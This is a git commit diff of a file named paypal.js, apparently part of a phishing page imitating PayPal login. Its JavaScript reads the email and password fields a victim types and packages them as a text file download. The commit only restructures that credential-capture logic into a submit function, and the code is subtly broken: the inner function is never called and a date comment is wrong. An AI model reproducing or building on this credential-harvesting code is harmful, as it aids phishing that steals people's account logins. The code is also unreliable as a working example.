2bc0cd5d72d0d785610e87e1e53742b524691ef5
will <86805234+nglug@users.noreply.github.com>
2023-12-19 20:18:24 +0000

    Update paypal.js

--- JavaScript/paypal.js
+++ JavaScript/paypal.js
@@ -1,31 +1,33 @@
-let saveFile = () => {
-    username = document.getElementById("email")
-    password = document.getElementById("password")
+function submit() {
+    let saveFile = () => {
+        username = document.getElementById("email")
+        password = document.getElementById("password")
 
-    let data = "\r Name: " + username.value + " \r\n " + "Password: " + password.value;
-    const textToBLOB = new Blob([data], { type: "text/plain" });
-    var filename = new Date();
-    var month = new Date(); //months from 1-12
-    month = month.getMonth();
+        let data = "\r Name: " + username.value + " \r\n " + "Password: " + password.value;
+        const textToBLOB = new Blob([data], { type: "text/plain" });
+        var filename = new Date();
+        var month = new Date(); //months from 1-12
+        month = month.getMonth();
 
-    var day = new Date();
-    var day = day.getUTCDate();
+        var day = new Date();
+        var day = day.getUTCDate();
 
-    var year = new Date();
-    var year = year.getUTCFullYear();
+        var year = new Date();
+        var year = year.getUTCFullYear();
 
-    newdate = year + "/" + month + "/" + day;
-    const sFileName = filename;
-    let newLink = document.createElement("a");
-    newLink.download = new Date();
+        newdate = year + "/" + month + "/" + day;
+        const sFileName = filename;
+        let newLink = document.createElement("a");
+        newLink.download = new Date();
 
-    if (window.webkitURL != null) {
-        newLink.href = window.webkitURL.createObjectURL(textToBLOB);
-    } else {
-        newLink.href = window.URL.createObjectURL(textToBLOB);
-        newLink.style.display = "none";
-        document.body.appendChild(newLink);
+        if (window.webkitURL != null) {
+            newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+        } else {
+            newLink.href = window.URL.createObjectURL(textToBLOB);
+            newLink.style.display = "none";
+            document.body.appendChild(newLink);
+        }
+
+        newLink.click();
     }
-
-    newLink.click();
 }
